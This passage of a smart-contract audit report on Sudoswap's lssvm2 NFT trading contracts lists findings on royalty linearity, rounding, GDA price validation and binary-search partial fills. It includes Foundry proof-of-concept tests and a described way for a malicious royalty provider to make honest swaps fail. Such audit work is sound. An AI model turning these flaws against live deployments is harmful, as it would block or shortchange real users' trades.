In this case, line 598 will be violated, and the max fillable functions will return incorrect `priceToFillAt` and `numItemsToFill`.

For example, `KODAV2` royalty calculation is NOT accurately linear to the input amount due to roundings.

```solidity
    function getKODAV2RoyaltyInfo(address _tokenAddress, uint256 _id, uint256 _amount)
        external
        view
        override
        returns (address payable[] memory receivers, uint256[] memory amounts)
    {
        // Get the edition the token is part of
        uint256 _editionNumber = IKODAV2(_tokenAddress).editionOfTokenId(_id);
        require(_editionNumber > 0, "Edition not found for token ID");

        // Get existing artist commission
        (address artistAccount, uint256 artistCommissionRate) = IKODAV2(_tokenAddress).artistCommission(_editionNumber);

        // work out the expected royalty payment
        uint256 totalRoyaltyToPay = (_amount / modulo) * creatorRoyaltiesFee;

        // Get optional commission set against the edition and work out the expected commission
        (uint256 optionalCommissionRate, address optionalCommissionRecipient) =
            IKODAV2(_tokenAddress).editionOptionalCommission(_editionNumber);
        if (optionalCommissionRate > 0) {
            receivers = new address payable[](2);
            amounts = new uint256[](2);

            uint256 totalCommission = artistCommissionRate + optionalCommissionRate;

            // Add the artist and commission
            receivers[0] = payable(artistAccount);
            amounts[0] = (totalRoyaltyToPay / totalCommission) * artistCommissionRate;//@audit-info rounding occurs here

            // Add optional splits
            receivers[1] = payable(optionalCommissionRecipient);
            amounts[1] = (totalRoyaltyToPay / totalCommission) * optionalCommissionRate;//@audit-info rounding occurs here
        } else {
            receivers = new address payable[](1);
            amounts = new uint256[](1);

            // Add the artist and commission
            receivers[0] = payable(artistAccount);
            amounts[0] = totalRoyaltyToPay;
        }

        return (receivers, amounts);
    }
```

If the royalty info provider returned higher royalty for a larger sale amount, the `priceToFillAt` will be higher than the actual sale.
Note that the `priceToFillAt` value calculated with the linearity assumption is used as a [minimum expected output parameter](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L351) for the function `ILSSVMPairERC721::swapNFTsForToken` within the swap sell logic. Similar reasoning holds for the swap-buy logic.

```solidity
VeryFastRouter.sol
345:                 // If we can sell at least 1 item...
346:                 if (numItemsToFill != 0) {
347:                     // If property checking is needed, do the property check swap
348:                     if (order.doPropertyCheck) {
349:                         outputAmount = ILSSVMPairERC721(address(order.pair)).swapNFTsForToken(
350:                             order.nftIds[:numItemsToFill],
351:                             priceToFillAt,//@audit-info min expected output
352:                             swapOrder.tokenRecipient,
353:                             true,
354:                             msg.sender,
355:                             order.propertyCheckParams
356:                         );
357:                     }
358:                     // Otherwise do a normal sell swap
359:                     else {
360:                         // Get subarray if ERC721
361:                         if (order.isERC721) {
362:                             outputAmount = order.pair.swapNFTsForToken(
363:                                 order.nftIds[:numItemsToFill], priceToFillAt, swapOrder.tokenRecipient, true, msg.sender
364:                             );
365:                         }
366:                         // For 1155 swaps, wrap as number
367:                         else {
368:                             outputAmount = order.pair.swapNFTsForToken(
369:                                 _wrapUintAsArray(numItemsToFill),
370:                                 priceToFillAt,
371:                                 swapOrder.tokenRecipient,
372:                                 true,
373:                                 msg.sender
374:                             );
375:                         }
376:                     }
377:                 }
```
Thus, the swap will fail if the `priceToFillAt` is calculated to be greater than the actual sale.

The Cyfrin team acknowledges that Sudoswap expects all collections to be ERC-2981 compliant, and EIP-2981 states that the royalty amount should be linear to the amount.
However, tokens can use a royalty lookup that is not compliant with EIP-2981 and can be abused to prevent honest users' valid transactions, so the protocol should not rely on the assumption that the royalty amount is linear.

**Impact:**
The linearity assumption can be violated, especially in the case of external royalty info providers (possibly malicious), and this can lead to protocol failing to behave as expected, as legitimate swaps will fail.
Due to these incorrect assumptions affecting the core functions, we evaluate the severity to HIGH.

**Recommended Mitigation:**
While we understand the protocol team intended to reduce gas costs by using the linearity assumption, we recommend using the actual royalty amount to calculate `priceToFillAt` and `numItemsToFill`.

**Sudoswap:**
Acknowledged. It is expected that the majority of NFTs will be ERC-2981 compliant.

**Cyfrin:**
Acknowledged.

## Medium Risk
### Possible reverts due to using stricter requirements in inner swap
**Description:**
`VeryFastRouter::swap` relies on the internal functions `VeryFastRouter::_findMaxFillableAmtForSell` and `VeryFastRouter::_findMaxFillableAmtForBuy` to find the maximum possible amount of tokens to be swapped.
The output is supposed to be the _actual_ cost of the swap, and it is used as the [`minExpectedTokenOutput`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/erc721/LSSVMPairERC721.sol#L92) parameter for selling logic and the [`maxExpectedTokenInput`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/erc721/LSSVMPairERC721.sol#L32) parameter for buying logic; however, this is problematic and can lead to protocol unintended protocol behavior because the actual cost of the swap can differ from the output of these functions. We pointed out the issue with linearity assumptions in another finding, but we are raising this separately because the actual pair's swap function is being called with stricter requirements.

```solidity
VeryFastRouter.sol
326:                 uint256 numItemsToFill;
327:                 uint256 priceToFillAt;
328:
329:                 {
330:                     // Grab royalty for calc in _findMaxFillableAmtForSell
331:                     (,, uint256 royaltyAmount) = order.pair.calculateRoyaltiesView(
332:                         order.isERC721 ? order.nftIds[0] : LSSVMPairERC1155(address(order.pair)).nftId(), BASE
333:                     );
334:
335:                     // Calculate the max number of items we can sell
336:                     (numItemsToFill, priceToFillAt) = _findMaxFillableAmtForSell(//@audit-info priceToFillAt >= order.minExpectedOutputPerNumNFTs
337:                         order.pair,
338:                         pairSpotPrice,
339:                         order.minExpectedOutputPerNumNFTs,
340:                         protocolFeeMultiplier,
341:                         royaltyAmount
342:                     );
343:                 }
344:
345:                 // If we can sell at least 1 item...
346:                 if (numItemsToFill != 0) {
347:                     // If property checking is needed, do the property check swap
348:                     if (order.doPropertyCheck) {
349:                         outputAmount = ILSSVMPairERC721(address(order.pair)).swapNFTsForToken(
350:                             order.nftIds[:numItemsToFill],
351:                             priceToFillAt,//@audit-info min expected output, different from the one specified by the user
352:                             swapOrder.tokenRecipient,
353:                             true,
354:                             msg.sender,
355:                             order.propertyCheckParams
356:                         );
357:                     }
358:                     // Otherwise do a normal sell swap
359:                     else {
360:                         // Get subarray if ERC721
361:                         if (order.isERC721) {
362:                             outputAmount = order.pair.swapNFTsForToken(
363:                                 order.nftIds[:numItemsToFill], priceToFillAt, swapOrder.tokenRecipient, true, msg.sender//@audit-info min expected output, different from the one specified by the user
364:                             );
365:                         }
366:                         // For 1155 swaps, wrap as number
367:                         else {
368:                             outputAmount = order.pair.swapNFTsForToken(
369:                                 _wrapUintAsArray(numItemsToFill),
370:                                 priceToFillAt,
371:                                 swapOrder.tokenRecipient,
372:                                 true,
373:                                 msg.sender
374:                             );
375:                         }
376:                     }
377:                 }

```

If the actual sale of the swap is lower than the output of `VeryFastRouter::_findMaxFillableAmtForSell` and `VeryFastRouter::_findMaxFillableAmtForBuy`, the swap will fail, but it could have passed if the original `minExpectedOutputPerNumNFTs` and `maxCostPerNumNFTs` were used instead.
If it can be guaranteed that the output of `VeryFastRouter::_findMaxFillableAmtForSell` and `VeryFastRouter::_findMaxFillableAmtForBuy` will always represent the exact sale/cost, this may be fine, but it is not clear why the original `minExpectedOutputPerNumNFTs` and `maxCostPerNumNFTs` are not used.

**Impact:**
Although this does not lead to direct loss of funds, we are evaluating the severity of MEDIUM because it can lead to unintended protocol behavior.

**Recommended Mitigation:**
We recommend using `minExpectedOutputPerNumNFTs` and `maxCostPerNumNFTs` instead of the output of `VeryFastRouter::_findMaxFillableAmtForSell` and `VeryFastRouter::_findMaxFillableAmtForBuy` as arguments to the actual swap functions.

**Sudoswap:**
Acknowledged. Given that the input values are expected to be returned from the Bonding Curve, this is likely to be an extremely rare occurance.

**Cyfrin:**
Acknowledged.

### Different rounding directions are recommended for getting buy/sell info
**Description:**
This issue pertains to the need for more implementation of different rounding directions for buy and sell operations in the AMM pools.
In several `ICurve` implementations (`XykCurve`, `GDACurve`), the `ICurve::getBuyInfo` and `ICurve::getSellInfo` functions are implemented using the same rounding direction.
This does not align with the best practices for AMM pools, which dictate that different rounding directions should be applied for buy and sell operations to prevent potential issues. The problem becomes more significant for tokens with fewer decimals, resulting in larger pricing discrepancies.

Note that `ExponentialCurve` explicitly uses different rounding directions for buy and sell operations, which aligns with the best practices.

Additionally, across all curves, calculations of the protocol and trade fees currently do not round in favor of the protocol and fee recipients, which means that value may leak from the system in favor of the traders.

**Impact:**
The issue may result in financial loss for pair creators and negatively impact the platform's overall stability, especially for tokens with fewer decimals. We, therefore, rate the severity as MEDIUM.

**Recommended Mitigation:**
Ensure that the buy price and protocol/trade fees are rounded up to prevent selling items at a lower price than desired and leaking value from the system.

**Sudoswap:**
Fixed in [commit 902eee](https://github.com/sudoswap/lssvm2/commit/902eee37890af3953a55472d885bf6265b329434).

**Cyfrin:**
Verified.


### GDACurve does not validate new spot price
**Description:**
The new spot price calculated in `GDACurve::getBuyInfo` and `GDACurve::getSellInfo` is not currently validated against `MIN_PRICE`, meaning that the price could fall below this value.

```solidity
GDACurve.sol (Line 81-91)

        // The new spot price is multiplied by alpha^n and divided by the time decay so future
        // calculations do not need to track number of items sold or the initial time/price. This new spot price
        // implicitly stores the the initial price, total items sold so far, and time elapsed since the start.
        {
            UD60x18 newSpotPrice_ = spotPrice_.mul(alphaPowN);
            newSpotPrice_ = newSpotPrice_.div(decayFactor);
            if (newSpotPrice_.gt(ud(type(uint128).max))) {
                return (Error.SPOT_PRICE_OVERFLOW, 0, 0, 0, 0, 0);
            } //@audit-info Missing minimum price check
            newSpotPrice = uint128(unwrap(newSpotPrice_));
        }
```

While a minimum price check is performed explicitly in `GDACurve::validateSpotPrice`, the same validation is missing when the price gets updated.

```solidity
GDACurve.sol (Line 34-36)

    function validateSpotPrice(uint128 newSpotPrice) external pure override returns (bool) {
        return newSpotPrice >= MIN_PRICE;
    }
```

Since the maximum value of the decay factor is capped at a significantly large value (2^20), in scenarios with high `lambda`, low initial price, and low demand (i.e. extended time intervals between successive purchases), there is a likelihood that spot price can drop below `MIN_PRICE` level (currently set to a constant value, `1 gwei`).

**Impact**
In most cases, dutch auctions tend to quickly find buyers long before prices hit the `MIN_PRICE` levels. Also, since the GDA bonding curve is only meant to be used for single-sided pools, there does not appear to be an immediate risk of pools trading large volumes at extremely low prices.
However, not having a reserve price could mean market-making for some pools can happen at extremely low prices in perpetuity.

**Recommended Mitigation:**
As with an exponential bonding curve, we recommend introducing minimum price validation in `GDACurve::getBuyInfo` and `GDACurve::getSellInfo` when the spot price is updated.

**Sudoswap:**
Fixed in [commit c4dc61](https://github.com/sudoswap/lssvm2/commit/c4dc6159b8e3a3252f82ef4afea1f62417994425).

**Cyfrin:**
Verified.


### Binary search implementation may not always find the optimal solution
**Description:**
`VeryFastRouter::_findMaxFillableAmtForBuy` and `VeryFastRouter::_findMaxFillableAmtForSell` utilize binary search to determine the maximum trade amount. The binary search seeks a solution in a linear, sorted space based on a test function (a criteria function used to decide the next search area). However, the current implementation is unlikely to guarantee this and might either fail to find a solution or identify a suboptimal one.

First, `VeryFastRouter::_findMaxFillableAmtForSell` attempts to find a solution in an array `[1, , minOutputPerNumNFTs.length]` and the test boolean function used is
`error != CurveErrorCodes.Error.OK || currentOutput < minOutputPerNumNFTs[(start + end) / 2 - 1] || currentOutput > pairTokenBalance`, where `currentOutput` is the number of tokens that the user will receive for the trade of `(start+end)/2-1` items.
If we represent the test criteria as `f(x)`, where `x` is the number of items to trade, and treat `true` as `1` and `false` as `0`, then `f([1, , minOutputPerNumNFTs.length])` should be like `[1, 1, .... 1, 0, ..., 0]` and the binary search should locate the final `1`.
To achieve this, each condition in the test function should produce outputs like `[1, 1, .... 1, 0, ..., 0]`; otherwise, the binary search may fail to find a solution or a suboptimal one.
However, `GDACurve` does not satisfy the condition `error != CurveErrorCodes.Error.OK`. As `x` (`numItems`) increases, `alphaPowN` increases, and `newSpotPrice_` decreases. Therefore, it will return `ERROR.SPOT_PRICE_OVERFLOW` for `x` less than a specific threshold and `ERROR.OK` for `x` greater than or equal to the threshold. As a result, the output of this condition will be like `[0, 0, .... 0, 1, ..., 1]` and not `[1, 1, .... 1, 0, ..., 0]`.

Next, in `VeryFastRouter::_findMaxFillableAmtForBuy`, the core criteria function for binary search is that the cost of buying `i` NFT's (let's call it `C[i]`) should be less than or equal to the max bid price placed by a user for purchasing `i` NFTs (`(i-1)-`th element in the `maxCostPerNumNFTs` array, `maxCostPerNumNFTs[i-1]`). The implicit assumption here is that, if `C[i] > maxCostPerNumNFTs[i-1]`, then `C[j] > maxCostPerNumNFTs[j-1]` for all `j > i`.
This implies that if the cost of purchasing `i` NFTs from the pool surpasses the maximum bid a user has placed for acquiring `i` NFTs, the purchase cost should persistently exceed the maximum bid even when attempting to buy a larger number of NFTs. This condition may not always hold true. For instance, if a user is solely interested in purchasing a larger collection of NFTs from a pool, they might place lower bids for buying a smaller quantity of items and more aggressive bids for acquiring a greater number of items in the pool.

**Proof of Concept:**
Consider a situation with the following conditions:

1. A pool containing a collection of 11 NFTs with an Exponential Bonding Curve (Spot Price: 1 eth, Delta: 1.05).
2. Alice computes the maximum bids for buying a collection of NFTs using `VeryFastRouter::getNFTQuoteForBuyOrderWithPartialFill`.
3. Alice desires to acquire a majority of the NFTs in the pool but is not interested in purchasing if she only obtains a smaller portion of the NFTs. To achieve these goals, she adjusts her max bid array as follows.
4. Alice reduces the max bid (calculated in step 2) for purchasing up to the first 50% of the total items in the pool by 25%.
5. Alice increases the max bid (calculated in step 2) for purchasing more than 50% of the total items in the pool by 10%.

Despite Alice's bid being sufficient to buy the entire collection, her order is only partially filled, and she receives a mere 5 NFTs out of the total 11.

The code snippet below replicates this scenario:
```
    function testSwapBinarySearch_audit() public{
        //START_INDEX=0, END_INDEX=10
        uint256[] memory nftIds;
        LSSVMPair pair;
        uint256 numNFTsForQuote = END_INDEX + 1;

        //1. create an array of nft ids
        nftIds = _getArray(START_INDEX, END_INDEX);
        assertEq(nftIds.length, END_INDEX - START_INDEX + 1);

        //2. setup a ERC721 ETH pair with property checker is zero address and zero deposit amount
        pair = setUpPairERC721ForSale(0, address(0), nftIds);

        //3. get the inputAmount needed to buy all NFTs in the pool
        (,,,uint256 inputAmount,,) = pair.getBuyNFTQuote(0, numNFTsForQuote);

        //4. get partialFillAmounts
        uint256[] memory partialFillAmounts = router.getNFTQuoteForBuyOrderWithPartialFill(pair, numNFTsForQuote, 0, 0);

        console.log("*********Max cost generated by getNFTQuoteForBuyOrderWithPartialFill**********");
        for(uint256 i; i< END_INDEX-START_INDEX + 1; i++){
            console.log("Max Cost (default) to buy %i items, %i", i+1, partialFillAmounts[i]);
        }

        // with no slippage, inputAmount should exactly be equal to the last partialFillAmount
        assertEq(inputAmount, partialFillAmounts[END_INDEX-START_INDEX]);


        uint256 midIndex = (END_INDEX - START_INDEX + 1 ) / 2;
        console.log("**********Max cost custom created by a user**********");
         for(uint256 j; j< END_INDEX-START_INDEX + 1; j++){
            if(j <= midIndex){
                    partialFillAmounts[j] -= partialFillAmounts[j] * 25 / 100; //@audit reduce max bid by 25%
            }
            else{
                   partialFillAmounts[j] += partialFillAmounts[j] * 10 / 100; //@audit increase max bid by 10%
            }
            console.log("Max Cost (custom) to buy %i items, %i", j+1, partialFillAmounts[j]);
        }
        //6 creating a single buy order for the pair
        VeryFastRouter.BuyOrderWithPartialFill memory buyOrder = VeryFastRouter.BuyOrderWithPartialFill({
            pair: pair,
            nftIds: nftIds,
            maxInputAmount: inputAmount,
            ethAmount: inputAmount,
            expectedSpotPrice: pair.spotPrice() + 1, //getPairBaseQuoteTokenBalancetriggers partial fill logic
            isERC721: true,
            maxCostPerNumNFTs: partialFillAmounts
        });

        VeryFastRouter.BuyOrderWithPartialFill[] memory buyOrders =
            new VeryFastRouter.BuyOrderWithPartialFill[](1); //adding a single buy order
        VeryFastRouter.SellOrderWithPartialFill[] memory sellOrders; //no sell orders, just a 0 length array

        buyOrders[0] = buyOrder;

        //check that nft recipient before swap does not have any nfts
        assertEq(IERC721(pair.nft()).balanceOf(NFT_RECIPIENT),0);

        //-n check that pair holds all the nfts that are part of the buy order
        assertEq(IERC721(pair.nft()).balanceOf(address(pair)), END_INDEX - START_INDEX + 1);

        VeryFastRouter.Order memory swapOrder = VeryFastRouter.Order({
            buyOrders: buyOrders,
            sellOrders: sellOrders, //-n no sell orders for this case
            tokenRecipient: payable(address(TOKEN_RECIPIENT)),
            nftRecipient: NFT_RECIPIENT,
            recycleETH: false
        });

        // Prank as the router caller and do the swap
        vm.startPrank(ROUTER_CALLER);
        address tokenAddress = getTokenAddress();

        // Set up approval for token if it is a token pair (for router caller)
        if (tokenAddress != address(0)) {
            ERC20(tokenAddress).approve(address(router), 1e18 ether); //-n give approval for very high amount
            IMintable(tokenAddress).mint(ROUTER_CALLER, 1e18 ether); //-n mint 1e18 ether
        }

        // // Store the swap results
        uint256[] memory swapResults = router.swap{value: inputAmount}(swapOrder);
        vm.stopPrank();

        //-n should only have one order
        assertEq(swapResults.length, buyOrders.length);

        console.log("Total NFTs in the pair", IERC721(pair.nft()).balanceOf(address(pair)));
        console.log("Total NFTs received by nft recipient", IERC721(pair.nft()).balanceOf(NFT_RECIPIENT));

        assertEq(IERC721(pair.nft()).balanceOf(NFT_RECIPIENT), midIndex);

    }
```

Output:

```solidity
  *********Max cost generated by getNFTQuoteForBuyOrderWithPartialFill**********
  Max Cost (default) to buy 1 items, 1710339358116313477
  Max Cost (default) to buy 2 items, 3339233984893754885
  Max Cost (default) to buy 3 items, 4890562200872270508
  Max Cost (default) to buy 4 items, 6368017644661333008
  Max Cost (default) to buy 5 items, 7775118067317583008
  Max Cost (default) to buy 6 items, 9115213707942583008
  Max Cost (default) to buy 7 items, 10391495270442583008
  Max Cost (default) to buy 8 items, 11607001520442583008
  Max Cost (default) to buy 9 items, 12764626520442583008
  Max Cost (default) to buy 10 items, 13867126520442583003
  Max Cost (default) to buy 11 items, 14917126520442583017
  **********Max cost custom created by a user**********
  Max Cost (custom) to buy 1 items, 1282754518587235108
  Max Cost (custom) to buy 2 items, 2504425488670316164
  Max Cost (custom) to buy 3 items, 3667921650654202881
  Max Cost (custom) to buy 4 items, 4776013233495999756
  Max Cost (custom) to buy 5 items, 5831338550488187256
  Max Cost (custom) to buy 6 items, 6836410280956937256
  Max Cost (custom) to buy 7 items, 11430644797486841308
  Max Cost (custom) to buy 8 items, 12767701672486841308
  Max Cost (custom) to buy 9 items, 14041089172486841308
  Max Cost (custom) to buy 10 items, 15253839172486841303
  Max Cost (custom) to buy 11 items, 16408839172486841318
  Total NFTs in the pair 6
  Total NFTs received by nft recipient 5
```

Despite the maximum bid for acquiring all 11 items being significantly higher than the true cost of the 11 items, the final outcome reveals that the user only obtains 5 items. Therefore, while users submit bids to purchase a larger quantity of NFTs, the existing implementation carries out a partial order and sells fewer NFTs to the user.

**Impact:**
This issue does not result in an immediate financial loss. Nevertheless, users acquire fewer NFTs than they originally planned to buy. Given the significance of the core logic, the impact of this issue is considered to be MEDIUM.

**Recommendation:**
While we acknowledge that using a brute-force approach as an alternative to binary search could consume a significant amount of gas, we suggest conducting a comprehensive examination of possible edge cases (across all curve implementations) to guarantee that the binary search yields the best solution for any reasonable user inputs.

**Sudoswap:**
Acknowledged.

**Cyfrin:**
Acknowledged.

## Low Risk
### Owner calling `LSSVMPair::changeSpotPrice` can cause arithmetic over/underflows on later swaps
**Description:**
Changing the spot price to a value higher than the current ERC20 (or ETH) balance of the pair can cause unintended reverts in valid swap calls later on.

**Proof of Concept:**

Full proof of concept [here](https://github.com/sudoswap/lssvm2/pull/1/files#diff-ccfdcc468a169eaf116e657d2cd2406530c2a693627167e375d78dcf8a73d87d). Snippet:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {InvariantERC721LinearERC20} from "./InvariantERC721LinearERC20.t.sol";
import {IERC721Mintable} from "../interfaces/IERC721Mintable.sol";

contract SwapArithmeticOverflow is InvariantERC721LinearERC20 {
    function setUp() public override {
        InvariantERC721LinearERC20.setUp();
    }

    function test_OverflowFail() public {
        s_pair.changeSpotPrice(20989589403855433688750111262);

        address payable msgSender = payable(0x0000000000000000000000000000000000004f89);
        changePrank(msgSender);

        uint256 newNFTId = 333;
        IERC721Mintable(address(s_test721)).mint(msgSender, newNFTId);
        (,,, uint256 minOutputAmount,,) = s_pair.getSellNFTQuote(newNFTId, 1);
        s_test721.approve(address(s_pair), newNFTId);
        uint256[] memory nftIds = new uint256[](1);
        nftIds[0] = newNFTId;

        vm.expectRevert("TRANSFER_FAILED");
        uint256 outputAmount = s_pair.swapNFTsForToken(nftIds, minOutputAmount, msgSender, false, address(0));
    }
}
```

**Impact:**
`ILSSVMPair::swapNFTsForToken` reverts with a `TRANSFER_FAILED` error message despite the user obtaining a quote using `ILSSVMPair::getSellNFTQuote` in a prior call.

**Recommended Mitigation:**
`ILSSVMPair::getSellNFTQuote` should return a legitimate error code if the expected output exceeds the pair's balance.
This mitigates the impact on the end user trying to perform the swap. It will return a helpful error in the view function prior to the swap attempt rather than passing there, then failing on the actual attempt with an arithmetic error.

**Sudoswap:**
Acknowledged, the risk is acceptable as it leads to reverts, but cannot affect users funds.
In the case of owners adjusting price prior to a swap, the intent is for users to use the minOutput/maxInput amounts to protect themselves from excessive slippage.

**Cyfrin:**
Acknowledged.

### Partially fillable order could revert
**Description:**
In the sell logic of `VeryFastRouter::swap`, the protocol does not check the fillable amount and executes the swap if [`pairSpotPrice == order.expectedSpotPrice`](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/VeryFastRouter.sol#L281). But this will revert if the pair has insufficient balance. On the other hand, if these criteria are not met, the protocol rechecks the max fillable amount, and a balance check is used in the binary search.

**Impact:**
Partially fillable orders would revert unnecessarily.
While this does not affect funds, users would experience a revert for valid transactions.

**Recommended Mitigation:**
Consider handling cases where the pair has insufficient balance to prevent reverting for partially fillable orders.

**Sudoswap:**
Acknowledged, as long as the bonding curve increases in price (i.e. price to buy the Xth item costs more than the price to buy the Xth-1 item) and the partial fill order is created in reverse order, then this issue is avoided.

**Cyfrin:**
Acknowledged.

### Make `LSSVMPair::call` payable to allow value to be sent with external calls
**Description:**
Currently, [`LSSVMPair::call`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMPair.sol#L640) simply passes a [value of zero](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMPair.sol#L661); however, there may be instances in which non-zero `msg.value` is required/desired and so the function should be marked as payable to allow the owner to supply ETH for the external call.

**Impact:**
If the owner wishes to send ETH with the external call, they cannot do so, which may impact the external call's functionality.

**Recommended Mitigation:**
Consider allowing value to be passed to external calls by making `LSSVMPair::call` payable.

**Sudoswap:**
Acknowledged.

**Cyfrin:**
Acknowledged.

## Informational
### Incorrect/incomplete NatSpec & comments
The NatSpec for `LSSVMPair::getAssetRecipient` currently [reads](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/LSSVMPair.sol#L319) "Returns the address that assets that receives assets when a swap is done with this pair" but it should be "Returns the address that receives assets when a swap is done with this pair". Additionally, in several instances, NatSpec could be more detailed to better explain parameters and return values, e.g. [`LSSVMPair::getSellNFTQuote`](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/LSSVMPair.sol#L245-L249).

`GDACurve::getSellInfo` has a [comment](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/bonding-curves/GDACurve.sol#L180) which currently reads "The expected output at for an auction at index n..." but should be "The expected output for an auction at index n...".

`LSSVMPairCloner::cloneERC1155ETHPair` has a [comment](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/lib/LSSVMPairCloner.sol#L299) "RUNTIME (53 bytes of code + 61 bytes of extra data = 114 bytes)" but this should be 93 bytes of extra data, so 146 bytes total which corresponds to 0x92 runtime size above. The same is true of `LSSVMPairCloner::cloneERC1155ERC20Pair`, which has the [comment](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/lib/LSSVMPairCloner.sol#L386) "RUNTIME (53 bytes of code + 81 bytes of extra data = 134 bytes)" but this should be 113 bytes of extra data, so 166 bytes total which corresponds to 0xa6 runtime size above.

The [comment](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/VeryFastRouter.sol#L604) "this is the max cost we are willing to pay, zero-indexed" in `VeryFastRouter::_findMaxFillableAmtForSell` should be this is the minimum output we are expecting from the sale, zero-indexed.

**Sudoswap:**
Fixed in commits [cb98b6](https://github.com/sudoswap/lssvm2/commit/cb98b66513a5dd149fcf169caafe6be370f5295b) and [9bf4be](https://github.com/sudoswap/lssvm2/commit/9bf4be10366b0339dbae08d77bbf7ff81d4f51ff).

**Cyfrin:**
Verified.


### Unreachable code path in `RoyaltyEngine::_getRoyaltyAndSpec`
Within `RoyaltyEngine`, `int16` values have been copied over from the manifold contract for use as enum values relating to different royalty specifications with `int16 private constant NONE = -1;` and `int16 private constant NOT_CONFIGURED = 0;`. The [if case](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/RoyaltyEngine.sol#L152) in `RoyaltyEngine::_getRoyaltyAndSpec` catches `spec <= NOT_CONFIGURED` so the following [code](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/RoyaltyEngine.sol#L237-L238) in the else block is not reachable and can be removed.
```solidity
if (spec == NONE) {
    return (recipients, amounts, spec, royaltyAddress, addToCache);
}
```

**Sudoswap:**
Fixed in commit [9bf4be](https://github.com/sudoswap/lssvm2/commit/9bf4be10366b0339dbae08d77bbf7ff81d4f51ff).

**Cyfrin:**
Acknowledged.

### `vm.prank()` before nested function call in tests does not work as intended
Foundry's prank cheat code applies to the next external call only. [Nested](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/test/base/VeryFastRouterAllSwapTypes.sol#L1090-L1092) [calls](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/test/base/VeryFastRouterWithRoyalties.sol#L1108-L1110) are evaluated right-to-left, and so the prank is not applied as intended. Either cache necessary function calls as local variables or use `vm.startPrank(addr)` and `vm.stopPrank()`. Extending tests to assert for expected event emissions is recommended and should help to catch cases like this.

**Sudoswap:**
Acknowledged.

**Cyfrin:**
Acknowledged.

### Event parameter names are incorrect
The first parameter in each of these `LSSVMPair` events is named incorrectly:

```solidity
event SwapNFTInPair(uint256 amountIn, uint256[] ids);
event SwapNFTInPair(uint256 amountIn, uint256 numNFTs);
event SwapNFTOutPair(uint256 amountOut, uint256[] ids);
event SwapNFTOutPair(uint256 amountOut, uint256 numNFTs);
```

They should instead look like this:

```solidity
event SwapNFTInPair(uint256 amountOut, uint256[] ids);
event SwapNFTInPair(uint256 amountOut, uint256 numNFTs);
event SwapNFTOutPair(uint256 amountIn, uint256[] ids);
event SwapNFTOutPair(uint256 amountIn, uint256 numNFTs);
```

**Sudoswap:**
Fixed in commit [29449e](https://github.com/sudoswap/lssvm2/commit/29449e45fd7ebaf1b932c135df65b08e998d1071).

**Cyfrin:**
Verified.

### `LSSVMPair` does not inherit `ILSSVMPair`
The interface `ILSSVMPair` is defined and used in several places, but the abstract `LSSVMPair` does not inherit from it.
Consider adding `is ILSSVMPair` to the `LSSVMPair` contract declaration.

**Sudoswap:**
Acknowledged.

**Cyfrin:**
Acknowledged.


### `MerklePropertyChecker::hasProperties` does not validate `ids.length` equals `proofList.length`
This function loops over supplied ids and performs proof verification to ensure each id is valid.
If additional proofs are supplied, the loop will terminate before these are reached and so they are never used in verification, but it is generally best practice to validate array lengths are equal.

**Sudoswap:**
Fixed in commit [0f8f94](https://github.com/sudoswap/lssvm2/pull/113/commits/0f8f94872743d67c304b310d22c653c8d75d80ea).

**Cyfrin:**
Verified.


## Gas Optimizations
### Redundant zero address check in `LSSVMPair::initialize`
The initializer argument `_assetRecipient` is assigned to the state variable only if it is not the zero address; however, in `LSSVMPair::getAssetRecipient`, the owner address is returned if `assetRecipient` is the zero address, and so this check is redundant. The default value is `address(0)`, and it will only be used in the `LSSVMPair::getAssetRecipient` function. For `LSSVMPair::getFeeRecipient`, fees will accrue on the pair contract itself in the case of a zero address asset recipient.

### Redundant zero value check in `LSSVMPair::getBuyNFTQuote` and `LSSVMPair::getSellNFTQuote`
The `numNFTs` argument to `LSSVMPair::getBuyNFTQuote` is validated to be a non-zero value; however, in `ICurve::getBuyNFTQuote`, all current implementations revert if the `numItems` parameter is zero, and so this check on the pair is redundant. The same reasoning applies to `LSSVMPair::getSellNFTQuote`.

### Simplify `LSSVMPair::_calculateBuyInfoAndUpdatePoolParams` and `LSSVMPair::_calculateSellInfoAndUpdatePoolParams` conditionals
Per the comment "Consolidate writes to save gas" in `LSSVMPair::_calculateBuyInfoAndUpdatePoolParams`, further optimizations can be made by reducing the logic to two if statements and storing values/emitting events together as follows:
```solidity
// Consolidate writes to save gas
// Emit spot price update if it has been updated
if (currentSpotPrice != newSpotPrice) {
    spotPrice = newSpotPrice;
    emit SpotPriceUpdate(newSpotPrice);
}

// Emit delta update if it has been updated
if (currentDelta != newDelta) {
    delta = newDelta;
    emit DeltaUpdate(newDelta);
}
```
The same recommendation applies to `LSSVMPair::_calculateSellInfoAndUpdatePoolParams`.

### Cache local variable earlier in `LSSVMPairERC20::_pullTokenInputs`
